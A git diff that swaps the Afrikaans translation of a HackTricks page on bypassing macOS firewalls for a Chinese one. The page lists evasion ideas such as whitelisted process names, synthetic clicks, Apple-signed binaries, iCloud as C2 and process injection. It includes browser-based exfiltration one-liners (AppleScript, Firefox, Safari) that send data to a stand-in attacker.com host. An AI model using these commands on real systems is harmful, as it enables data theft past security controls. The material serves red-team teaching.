@@ -1,57 +1,57 @@
-# macOS Deurbranders omseil
+# macOS 绕过防火墙
 
 {% hint style="success" %}
-Leer & oefen AWS Hack: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Rooi Span Kenner (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Rooi Span Kenner (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
 
-## Gevonde tegnieke
+## 发现的技术
 
-Die volgende tegnieke is gevind wat werk in sommige macOS deurbrandtoepassings.
+以下技术在某些 macOS 防火墙应用中有效。
 
-### Misbruik van witlysname
+### 滥用白名单名称
 
-* Byvoorbeeld om die kwaadwillige sagteware te noem met name van bekende macOS prosesse soos **`launchd`**
+* 例如使用知名 macOS 进程的名称调用恶意软件，如 **`launchd`**
 
-### Sintetiese Kliek
+### 合成点击
 
-* As die deurbranders toestemming aan die gebruiker vra, laat die kwaadwillige sagteware **toestemming gee**
+* 如果防火墙要求用户授权，让恶意软件 **点击允许**
 
-### **Gebruik Apple-ondertekende binêre lêers**
+### **使用苹果签名的二进制文件**
 
-* Soos **`curl`**, maar ook ander soos **`whois`**
+* 如 **`curl`**，还有其他如 **`whois`**
 
-### Bekende apple-domeine
+### 知名苹果域名
 
-Die deurbranders kan verbindinge toelaat na bekende apple-domeine soos **`apple.com`** of **`icloud.com`**. En iCloud kan gebruik word as 'n C2.
+防火墙可能允许连接到知名的苹果域名，如 **`apple.com`** 或 **`icloud.com`**。iCloud 可以用作 C2。
 
-### Generiese Omseiling
+### 通用绕过
 
-Sommige idees om deurbranders te probeer omseil
+一些尝试绕过防火墙的想法
 
-### Kontroleer toegelate verkeer
+### 检查允许的流量
 
-Om die toegelate verkeer te ken sal jou help om potensieel witlys-domeine te identifiseer of watter toepassings toegelaat word om daartoe toegang te verkry
+了解允许的流量将帮助您识别潜在的白名单域名或哪些应用程序被允许访问它们。
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
-### Misbruik van DNS
+### 滥用 DNS
 
-DNS-oplossings word gedoen via die **`mdnsreponder`** ondertekende aansoek wat waarskynlik toegelaat sal word om DNS-bedieners te kontak.
+DNS 解析是通过 **`mdnsreponder`** 签名应用程序完成的，该应用程序可能被允许联系 DNS 服务器。
 
 <figure><img src="../../.gitbook/assets/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
 
-### Via Blaaier-toepassings
+### 通过浏览器应用程序
 
 * **oascript**
 ```applescript
@@ -62,7 +62,7 @@ make new document
 set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
 end tell
 ```
-* Google Chrome
+* 谷歌浏览器
 
 {% code overflow="wrap" %}
 ```bash
@@ -70,7 +70,7 @@ end tell
 ```
 {% endcode %}
 
-* Vuurvos
+* 火狐浏览器
 ```bash
 firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```
@@ -78,29 +78,29 @@ firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
-### Via prosesinspuitings
+### 通过进程注入
 
-Indien jy **kode in 'n proses kan inspuit** wat toegelaat word om met enige bediener te verbind, kan jy die vuurmuurbeveiligings omseil:
+如果你可以**将代码注入到一个被允许连接到任何服务器的进程中**，你就可以绕过防火墙保护：
 
 {% content-ref url="macos-proces-abuse/" %}
 [macos-proces-abuse](macos-proces-abuse/)
 {% endcontent-ref %}
 
-## Verwysings
+## 参考文献
 
 * [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
 
 {% hint style="success" %}
-Leer & oefen AWS-hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP-hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
